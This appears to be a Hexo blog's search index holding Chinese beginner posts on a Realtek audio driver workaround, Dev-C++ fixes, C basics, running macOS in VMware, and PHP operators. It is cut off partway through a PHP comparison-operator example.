<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>联想Y7000喇叭杂音解决方案</title>
      <link href="/posts/49630.html"/>
      <url>/posts/49630.html</url>
      
        <content type="html"><![CDATA[<p>5月2号天气晴，今天还是一如既往的先听完歌在学习，结果听歌的过程中发现触摸板下面传来了滋滋的杂音，？？？<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200502213609.gif" alt=""></p><p>经过排查发现，卸载Realtek声卡驱动后，此现象会消失，但是在联网状态下会被快速重新推送安装上此Realtek声卡驱动，导致现象重新出现。由此，我们初步判断为Realtek声卡驱动软件问题导致此现象的可能性较高，！！！因此也排除了硬件问题。</p><h1 id="临时解决方案："><a href="#临时解决方案：" class="headerlink" title="临时解决方案："></a>临时解决方案：</h1><p>1、进入设备管理器，找到小喇叭图标</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200502214424.PNG" alt=""></p><p>2、找到“Realtek Audio”，右键菜单中选择“更新驱动程序”；</p><p>点击“浏览我的计算器以查找驱动程序软件”；</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200502214423.PNG" alt=""></p><p>3、点击“让我从计算机上的可用驱动程序列表中选取”；</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200502214425.PNG" alt=""></p><p>4、点击“High Definition Audio设备”；</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200502214426.PNG" alt=""></p><p>此过程会提示 不兼容问题，选择接受是。之后安装成功，</p><p>重启计算机，就会发现滋滋声没了。</p><p>给我强迫症都比出来，，，难受。</p><p>听歌自带混响？？电流？</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200502215055.jpg" alt=""></p><p>之前看了网上需要刷BIOS感觉步骤猥琐，所以就没采取。</p><p>而且刷BIOS在一定程度会损坏机子。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dev C++问题汇总</title>
      <link href="/posts/36053.html"/>
      <url>/posts/36053.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-编译器设置验证报错解决方案"><a href="#1-编译器设置验证报错解决方案" class="headerlink" title="1): 编译器设置验证报错解决方案"></a>1): 编译器设置验证报错解决方案</h3><p><strong>按照提示的路径找到对应文件夹，重命名文件夹名字与提示的对应。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200429190814.png" alt=""></p><h3 id="2-devc-在win10下看起来很模糊的详细处理方案"><a href="#2-devc-在win10下看起来很模糊的详细处理方案" class="headerlink" title="2):devc++在win10下看起来很模糊的详细处理方案"></a>2):devc++在win10下看起来很模糊的详细处理方案</h3><p>1，右键点击桌面显示模糊的应用程序，菜单栏选择“属性”。</p><p>2，弹出的小窗口点击“兼容性”，接着点击进入“更改DPI设置”。</p><p>3，然后勾选“代替DPI缩放行为”，最后点击“确定”就可以了。</p><p><strong>图文步骤：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200429191138.png" alt=""></p><p>更改前：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200429191228.png" alt=""></p><p>更改后：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200429191227.png" alt=""></p><h3 id="3-编辑器自定义主题"><a href="#3-编辑器自定义主题" class="headerlink" title="3):编辑器自定义主题"></a>3):编辑器自定义主题</h3><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200429194723.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言概述</title>
      <link href="/posts/35294.html"/>
      <url>/posts/35294.html</url>
      
        <content type="html"><![CDATA[<p>C语言核心开发步骤四个：</p><p><strong>1):</strong> 写代码</p><p><strong>2):</strong> 编译</p><p><strong>3):</strong>链接</p><p><strong>4):</strong>运行</p><ul><li><strong>使用的编辑器：</strong></li></ul><p>VC6.0++  ——   Dev-C++    （别问为啥用老版本编辑器，因为我是小白）</p><p>VC安装步骤：<a href="http://thecat.top/index.php/archives/339/" target="_blank" rel="noopener">http://thecat.top/index.php/archives/339/</a></p><ul><li><strong>使用Dev-C++  编写 我的 第一个 C程序：</strong><ul><li>快捷键   编译：f9   ;;    运行f10</li></ul></li></ul><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World ! \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200428200937.PNG" alt=""></p><ul><li><p><strong>老师说考试会考，拿小本本记下来</strong></p><ul><li><p>美国国家标准协会ANSI</p></li><li><p>最新的C语言标准C99于1999年颁布，20000年3月被ANSI采用。</p></li></ul></li></ul><h2 id="语句注释："><a href="#语句注释：" class="headerlink" title="语句注释："></a>语句注释：</h2><p><code>#include &lt;stdio.h&gt;</code>            预处理指令</p><p><code>int main()</code>         主函数的函数头</p><p><code>{</code>          函数体的开始标记  </p><p><code>printf("Hello，World！\n");</code>            输出的内容 ;  ——-&gt;<code>\n</code> 转义字符，表示换行。</p><p><code>return 0;</code>           程序的返回值为0</p><p><code>}</code>             函数的结束标记</p><blockquote><p>如果返回值改为1的话；；那么终端也就返回一个1</p></blockquote><ul><li><p><code>&lt;stdio.h&gt;</code>    基本输入输出头文件 ；；尖括号可以换成<code>"  "</code> </p></li><li><p>C语言有且只能有一个主函数。</p></li><li><p>每一条语句以<code>;</code> 结束。</p></li></ul><h2 id="代码注释符号："><a href="#代码注释符号：" class="headerlink" title="代码注释符号："></a>代码注释符号：</h2><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// 单行注释</span></code></pre><pre><code>/*多行注释*/</code></pre><blockquote><p><strong>1）：</strong>一个完整的C程序由一个或多个源程序构成。</p><p>2）：<strong>任何一个C程序必须包含一个main函数，可以包含多个其他函数。</strong></p><p><strong>3）：</strong> 一个函数由两部分组成，函数头和函数体；若一个函数体有多个大括号，那么最外层就是这个函数体的范围。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机15.5.2Pro装MAC系统</title>
      <link href="/posts/35121.html"/>
      <url>/posts/35121.html</url>
      
        <content type="html"><![CDATA[<p>VMware版本如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200428170842.png" alt=""></p><h1 id="打补丁"><a href="#打补丁" class="headerlink" title="打补丁"></a>打补丁</h1><p>首先下载unlocker-master注入破解补丁，使得虚拟机有Apple选项 可以选择mac os镜像。。</p><p>这里需要注意的是镜像后缀智能是<code>.cdr</code>或者<code>.iso</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200428170847.png" alt=""></p><p>注入完补丁之后，同文件夹下会出现两个文件夹 如图。。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200428170846.png" alt=""></p><ul><li>为了避免报错创建完虚拟机之后，需要配置一下VMX文件，如下图所示;</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200428170845.png" alt=""></p><h1 id="解决连接不上服务器下载不了Vmware-Tools"><a href="#解决连接不上服务器下载不了Vmware-Tools" class="headerlink" title="解决连接不上服务器下载不了Vmware Tools"></a>解决连接不上服务器下载不了Vmware Tools</h1><p>首先下载 我这里的准备好的VMware tools，，，，</p><p>下载好了需要配置以下几点，方可安装。</p><p>1、在Mac中配置Finder偏好设置，，，，</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200428170843.png" alt=""></p><p>2、虚拟机-可移动设备-cd 设置，，选择刚刚下载好的Vmware Tools，，导入mac安装即可。。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200428170844.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200428170841.png" alt=""></p><p>安装完重启Mac 屏幕就是全屏自适应的  如下：：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200428170822.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP运算符优先级</title>
      <link href="/posts/45326.html"/>
      <url>/posts/45326.html</url>
      
        <content type="html"><![CDATA[<p><strong>运算符的优先级</strong></p><blockquote><p>概念：谁的优先级高，就先算谁！</p><p>结合方向：规定从哪个方向开始算。</p><p><a href="https://www.php.net/manual/zh/language.operators.precedence.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.operators.precedence.php</a></p></blockquote><p><strong>常用的优先级：</strong></p><pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>无<span class="token punctuation">]</span>递增递减<span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>右<span class="token punctuation">]</span>逻辑非<span class="token operator">!</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>左<span class="token punctuation">]</span>乘，除，取余<span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>左<span class="token punctuation">]</span>加，减，字符串连接符<span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>无<span class="token punctuation">]</span>包含大于号或者小于号的比较运算符<span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>无<span class="token punctuation">]</span>不包含大于号或者小于号的比较运算符<span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>左<span class="token punctuation">]</span>逻辑与<span class="token operator">&amp;&amp;</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>左<span class="token punctuation">]</span>逻辑或<span class="token operator">||</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>左<span class="token punctuation">]</span><span class="token operator">?</span> <span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>右<span class="token punctuation">]</span>赋值运算符<span class="token number">12</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>左<span class="token punctuation">]</span>逻辑异或<span class="token keyword">xor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 的作用：用圆括号可以将表达式里面的某一块看成一个整体！！！<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 40</span><span class="token operator">*</span><span class="token operator">*</span> 使用括号可以增加代码的可读性。哪怕有的地方不需要加括号，你也可以加上括号。举个例子：<span class="token keyword">echo</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 6</span><span class="token operator">*</span>对应<span class="token constant">PHP</span>开发手册来理解。<span class="token operator">*</span></code></pre><p>举个例子：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 6</span></code></pre><p>先考虑谁的优先级高，就先算谁！！！</p><p>结合方向 举个例子：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//看手册运算符优先级。(3 * 3) % 5 </span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//4</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP其它运算符</title>
      <link href="/posts/12840.html"/>
      <url>/posts/12840.html</url>
      
        <content type="html"><![CDATA[<p><strong>其它运算符</strong></p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span><span class="token punctuation">:</span>@<span class="token operator">=</span><span class="token operator">></span><span class="token operator">-</span><span class="token operator">></span>inst anceof</code></pre><p><strong>1): ?:</strong></p><blockquote><p>三元运算符：涉及三个表达式</p><p>格式：</p><p><code>表达式1 ？表达式2 :  表达式3;</code></p><p>//如果表达式1 的值为true，那么就执行表达式2，否则那么就执行表达式3.</p></blockquote><p>举个栗子：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token operator">?</span> <span class="token number">10</span> <span class="token punctuation">:</span> <span class="token number">20</span> <span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//输出结果：10</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token operator">?</span> <span class="token number">10</span> <span class="token punctuation">:</span> <span class="token number">20</span> <span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//输出结果：20</span></code></pre><p><strong>2): ``</strong></p><blockquote><p>可以把系统命令放在里面执行。</p></blockquote><p>举个例子：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> `ping www<span class="token punctuation">.</span>thecat<span class="token punctuation">.</span>top`<span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><del>几乎用不到，这个涉及到跨平台。。。Windows和Linux命令不一样</del></p><p><strong>3): @</strong></p><blockquote><p>屏蔽表达式可能发生的错误！！！</p></blockquote><p>举个例子;</p><pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//网页会报错显示粗来</span><span class="token comment" spellcheck="true">//使用 小老鼠 屏蔽</span><span class="token keyword">echo</span> @<span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//屏蔽网页报错 不会显示。</span></code></pre><p><strong>4):  =&gt;</strong></p><p><strong>5): -&gt;</strong></p><p><strong>6): instanceof</strong></p><p>找到对象再回来补上<del>~</del></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP位运算符</title>
      <link href="/posts/26298.html"/>
      <url>/posts/26298.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>位运算符允许对整型数中指定的位进行求值和操作。</p></blockquote><p><strong>位运算符</strong><br>| 例子 | 名称 | 结果 |<br>| — | — | — |<br>| <strong><code>$a &amp; $b</code></strong> | And（按位与） | 将把  $a  和  $b  中都为 1 的位设为 1。 |<br>| <strong><code>$a | $b</code></strong> | Or（按位或） | 将把  $a  和  $b  中任何一个为 1 的位设为 1。 |<br>| <strong><code>$a ^ $b</code></strong> | Xor（按位异或） | 将把  $a  和  $b  中一个为 1 另一个为 0 的位设为 1。 |<br>| <strong><code>~ $a</code></strong> | Not（按位取反） | 将  $a  中为 0 的位设为 1，反之亦然。 |<br>| <strong><code>$a &lt;&lt; $b</code></strong> | Shift left（左移） | 将  $a  中的位向左移动  $b  次（每一次移动都表示“乘以 2”）。 |<br>| <strong><code>$a &gt;&gt; $b</code></strong> | Shift right（右移） | 将  $a  中的位向右移动  $b  次（每一次移动都表示“除以 2”）。 |</p><p>网站开发一般用不到，先走马观花的了解一下！！！</p><p><a href="https://www.php.net/manual/zh/language.operators.bitwise.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.operators.bitwise.php</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP逻辑运算符</title>
      <link href="/posts/13099.html"/>
      <url>/posts/13099.html</url>
      
        <content type="html"><![CDATA[<h1 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h1><blockquote><ul><li>概念：</li></ul><p>对表达式进行逻辑运算，运算的结果是布尔类型的值（true , false）</p><ul><li>要求：参与逻辑运算的表达式的值是布尔型的值，如果不是布尔类型的值会被自动转换成布尔类型的值，然后再参与运算！</li></ul></blockquote><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token keyword">and</span> <span class="token variable">$b</span> <span class="token keyword">And</span> <span class="token punctuation">(</span>逻辑与<span class="token punctuation">)</span><span class="token variable">$a</span> <span class="token keyword">or</span> <span class="token variable">$b</span> <span class="token keyword">Or</span> <span class="token punctuation">(</span>逻辑或<span class="token punctuation">)</span><span class="token variable">$a</span> <span class="token keyword">xor</span> <span class="token variable">$b</span> <span class="token keyword">Xor</span> <span class="token punctuation">(</span>逻辑异或<span class="token punctuation">)</span><span class="token operator">!</span><span class="token variable">$a</span>        <span class="token function">Not</span> <span class="token punctuation">(</span>逻辑非<span class="token punctuation">)</span><span class="token variable">$a</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$b</span> <span class="token keyword">And</span><span class="token punctuation">(</span>逻辑与<span class="token punctuation">)</span><span class="token variable">$a</span> <span class="token operator">||</span> <span class="token variable">$b</span> <span class="token keyword">Or</span> <span class="token punctuation">(</span>逻辑或<span class="token punctuation">)</span></code></pre><p><strong>1): and 或者 &amp;&amp;</strong>    </p><blockquote><p>逻辑与：</p><p>左右两边的表达式的值都为true，运算的结果就是true；</p><p>只要其中有一个为false，运算的结果就是false。</p></blockquote><p>示例:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//运算结果：bool(true)</span><span class="token delimiter">?></span></code></pre><ul><li><p>理解：</p><ul><li>把<code>$a</code>和<code>$b</code> 比喻成语文和数学，当语文和数学都及格的时候那么，最终的结果才是及格（true）；否则就是不及格（false）。</li></ul></li></ul><blockquote><p>强制转换语法：</p><p><code>var_dump((转换类型)变量/数值);</code></p><ul><li><p>以下被认为是false，其它的都是true。</p><p>① 布尔值 false</p><p>② 0</p><p>③ 浮点型 0.0</p><p>④ 空白字符串 和 字符串 0    </p><p>//空白字符串指的是一对单引号或者双引号里面没有任何内容。</p><ul><li>空格不是空白字符串。</li></ul><p>⑤ 没有成员的数组 <code>array()</code></p><p>⑥ NULL</p></li></ul></blockquote><p><strong>2): or 或  || 逻辑或</strong></p><blockquote><p>规则：</p><p>左右两边的表达式的值，只要有一个为true，运算结果就是true；</p><p>只有两边的值是false，结果才会是false。</p></blockquote><p>示例：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">||</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//bool(true)</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">||</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//bool(false)</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">||</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//bool(true)</span></code></pre><p><strong>3): xor 逻辑异或</strong></p><blockquote><p>规则：</p><p>左右两边的表达式的值不一样的时候结果就是true，</p><p>如果一样那么运算的结果就是false。</p></blockquote><p>示例：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">xor</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//bool(true)</span><span class="token comment" spellcheck="true">//输出的时候会把变量值自动转换布尔类型。</span></code></pre><p><strong>4): ! 逻辑非</strong></p><blockquote><p>规则：</p><p>将原来表达式的值否定掉，原来是true那么结果就是false，</p><p>原来是false 那么 结果与之相反。true</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//var_dump(!false)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP比较运算符</title>
      <link href="/posts/59521.html"/>
      <url>/posts/59521.html</url>
      
        <content type="html"><![CDATA[<p><strong>php比较运算符</strong></p><blockquote><p>对操作数（按照比较运算符的要求、规则）进行比较。</p><p>如果比较出的结果满足比较运算符的规则那么结果就是true，否则为false。</p><ul><li><p>PHP规定：</p><ul><li><p>使用echo输出布尔类型值的时候；</p><ul><li><p><code>echo true;</code> 它会在页面输出1</p></li><li><p><code>echo false;</code> 网页啥都不会输出（空白）</p><ul><li>所以在测试过程中如果需要输出布尔类型值的时候我们最好使用<code>var_dump()</code>来输出精确结果。_</li></ul></li></ul></li></ul></li></ul></blockquote><pre><code> $a == $b 等于 $a === $b 全等 $a != $b 不等 $a &lt;&gt; $b 不等 $a !== $b 不全等. $a &lt; $b 小于 $a &gt; $b 大于 $a &lt;= $b 小于等于 $a &gt;= $b 大于等于</code></pre><p><strong>1): ==  等于</strong></p><blockquote><p>如果值相等则返回true（真，成立）；</p><p>如果值不相等则返回false（假，不成立）；</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">var_bump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//使用 echo $a==$b; //输出结果为1</span>    <span class="token comment" spellcheck="true">//输出结果：bool(true)</span><span class="token delimiter">?></span></code></pre><p><strong>2): === 全等于</strong></p><blockquote><ul><li><p>值相等</p></li><li><p>类型相等</p></li></ul></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//int整形</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token string">'11'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//字符串</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">===</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//输出结果：bool(false)</span><span class="token comment" spellcheck="true">//值相等，类型不等</span><span class="token delimiter">?></span></code></pre><p><strong>3): != 不等</strong></p><blockquote><p>如果两边操作数的值不相等那么输出true，如果相等则输出false。</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token number">1</span><span class="token 